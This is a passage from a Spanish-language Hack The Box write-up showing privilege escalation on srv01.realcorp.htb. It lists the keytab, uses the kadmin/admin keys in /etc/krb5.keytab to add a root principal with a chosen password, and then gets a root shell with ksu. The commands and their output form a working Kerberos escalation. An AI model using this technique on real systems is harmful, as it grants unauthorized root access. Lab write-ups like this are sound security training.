<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">admin@srv01 </span><span style="color:#AB5959;--shiki-dark:#89DDFF">~</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ file /etc/krb5.keytab</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">krb5.keytab:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Kerberos</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Keytab</span><span style="color:#B56959;--shiki-dark:#C3E88D"> file,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> realm=REALCORP.HTB,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> principal=host/srv01.realcorp.htb,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> type=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#B56959;--shiki-dark:#C3E88D">,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> date=Tue</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  8</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 22</span><span style="color:#B56959;--shiki-dark:#C3E88D">:15:30</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2020</span><span style="color:#B56959;--shiki-dark:#C3E88D">,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kvno=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2</span></span></code></pre> 
<p>Investiguemos qué hace este archivo y cómo abrirlo.</p>
<p>Segun la doc de MIT Kerberos, la tabla de claves es un archivo que almacena claves para los principales.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">admin@srv01 etc</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ klist -k /etc/krb5.keytab </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Keytab</span><span style="color:#B56959;--shiki-dark:#C3E88D"> name:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> FILE:/etc/krb5.keytab</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">KVNO</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Principal</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">----</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --------------------------------------------------------------------------</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> host/srv01.realcorp.htb@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/changepw@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/changepw@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/changepw@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/changepw@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/changepw@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/admin@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/admin@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/admin@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/admin@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">   2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> kadmin/admin@REALCORP.HTB</span></span></code></pre> 
<h1 id="privilege-escalation">Privilege escalation</h1>
<p>Parece que nuestro usuario también es un kadmin. Esto nos permite agregar principals a la tabla de claves. Podemos explotar esto agregando el usuario root a la tabla de claves con nuestra contraseña especificada.
Agregando root a la lista de principals keytab</p>
<p>Agregamos el usuario root con la password</p>
<p>[admin@srv01 etc]$ kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q “add_principal -pw test <a href="mailto:root@REALCORP.HTB">root@REALCORP.HTB</a>”
Couldn’t open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
No policy specified for <a href="mailto:root@REALCORP.HTB">root@REALCORP.HTB</a>; defaulting to no policy
Principal ”<a href="mailto:root@REALCORP.HTB">root@REALCORP.HTB</a>” created.</p>
<p>Ahora podemos usar ksu (ksu - Kerberized super-user) para su a root. (El archivo Keytab se restablece periódicamente, por lo que debemos ser rápidos).</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">admin@srv01 etc</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ ksu</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">WARNING:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Your</span><span style="color:#B56959;--shiki-dark:#C3E88D"> password</span><span style="color:#B56959;--shiki-dark:#C3E88D"> may</span><span style="color:#B56959;--shiki-dark:#C3E88D"> be</span><span style="color:#B56959;--shiki-dark:#C3E88D"> exposed</span><span style="color:#B56959;--shiki-dark:#C3E88D"> if</span><span style="color:#B56959;--shiki-dark:#C3E88D"> you</span><span style="color:#B56959;--shiki-dark:#C3E88D"> enter</span><span style="color:#B56959;--shiki-dark:#C3E88D"> it</span><span style="color:#B56959;--shiki-dark:#C3E88D"> here</span><span style="color:#B56959;--shiki-dark:#C3E88D"> and</span><span style="color:#B56959;--shiki-dark:#C3E88D"> are</span><span style="color:#B56959;--shiki-dark:#C3E88D"> logged</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">         in</span><span style="color:#393A34;--shiki-dark:#BABED8"> remotely using an unsecure </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">non-encrypted</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8"> channel. </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Kerberos</span><span style="color:#B56959;--shiki-dark:#C3E88D"> password</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root@REALCORP.HTB:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Authenticated</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root@REALCORP.HTB</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Account</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> authorization</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root@REALCORP.HTB</span><span style="color:#B56959;--shiki-dark:#C3E88D"> successful</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Changing</span><span style="color:#B56959;--shiki-dark:#C3E88D"> uid</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#393A34;--shiki-dark:#BABED8"> (0)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">root@srv01 etc</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">#</span></span></code></pre> 
<p>Iniciamos Sesion con exito como root.</p> </div> <!-- related posts --> <footer> <h2 class="font-bold text-lg dark:text-white mb-6">Related Posts</h2> <section class="flex flex-col md:flex-row sm:justify-between gap-8"> <div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.RoQopAdK_Z1NbdEt.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Shocker - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/shocker/"> Shocker - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/1.ZSJa8MzA_u0erP.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Soccer - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/soccer/"> Soccer - HTB Writeup </a> </header> </div> </section> </footer> </article> </div>  </div> </article>  <footer class="flex justify-center items-center w-full px-16 h-28 border-t-2">
&copy; 2024 Your Name. All rights reserved.
</footer> </main>    </body> </html> 